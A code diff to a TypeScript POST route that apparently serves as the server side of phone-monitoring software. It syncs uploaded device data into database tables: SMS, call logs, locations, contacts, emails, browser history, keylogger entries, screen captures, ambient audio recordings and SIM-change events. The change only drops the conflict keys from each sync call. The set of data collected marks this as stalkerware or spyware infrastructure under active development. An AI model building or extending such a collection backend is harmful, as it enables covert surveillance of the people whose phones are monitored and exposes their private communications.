@@ -119,29 +119,29 @@ export async function POST(req: Request) {
 
     // ── 1. Basic Tables Sync ──
     const targetTables = [
-      { key: "sms", db: "sms_messages", conflict: "device_id,timestamp,sender_number" },
-      { key: "calls", db: "call_logs", conflict: "device_id,timestamp,phone_number" },
-      { key: "locations", db: "locations", conflict: "device_id,timestamp" },
-      { key: "contacts", db: "contacts", conflict: "device_id,phone_number" },
-      { key: "installed_apps", db: "installed_apps", conflict: "device_id,package_name" },
-      { key: "app_usage", db: "app_usage", conflict: "device_id,app_name,start_time" },
-      { key: "media_files", db: "media_files", conflict: "device_id,file_path" },
-      { key: "social_messages", db: "social_messages", conflict: "device_id,timestamp,platform" },
-      { key: "browser_history", db: "browser_history", conflict: "device_id,timestamp,url" },
-      { key: "browser_bookmarks", db: "browser_bookmarks", conflict: "device_id,url" },
-      { key: "keylog_entries", db: "keylog_entries", conflict: "device_id,timestamp,app_name" },
-      { key: "calendar_events", db: "calendar_events", conflict: "device_id,title,start_time" },
-      { key: "emails", db: "emails", conflict: "device_id,timestamp,subject" },
-      { key: "wifi_networks", db: "wifi_networks", conflict: "device_id,ssid" },
-      { key: "notifications_log", db: "notification_logs", conflict: "device_id,timestamp,app_name" },
-      { key: "sim_changes", db: "sim_changes", conflict: "device_id,timestamp" },
-      { key: "screen_captures", db: "screen_captures", conflict: "device_id,timestamp" },
-      { key: "ambient_recordings", db: "ambient_recordings", conflict: "device_id,timestamp" }
+      { key: "sms", db: "sms_messages" },
+      { key: "calls", db: "call_logs" },
+      { key: "locations", db: "locations" },
+      { key: "contacts", db: "contacts" },
+      { key: "installed_apps", db: "installed_apps" },
+      { key: "app_usage", db: "app_usage" },
+      { key: "media_files", db: "media_files" },
+      { key: "social_messages", db: "social_messages" },
+      { key: "browser_history", db: "browser_history" },
+      { key: "browser_bookmarks", db: "browser_bookmarks" },
+      { key: "keylog_entries", db: "keylog_entries" },
+      { key: "calendar_events", db: "calendar_events" },
+      { key: "emails", db: "emails" },
+      { key: "wifi_networks", db: "wifi_networks" },
+      { key: "notifications_log", db: "notification_logs" },
+      { key: "sim_changes", db: "sim_changes" },
+      { key: "screen_captures", db: "screen_captures" },
+      { key: "ambient_recordings", db: "ambient_recordings" }
     ]
 
     for (const table of targetTables) {
       if (body[table.key]) {
-        await syncTable(table.db, body[table.key], table.conflict)
+        await syncTable(table.db, body[table.key], undefined)
       }
     }
 
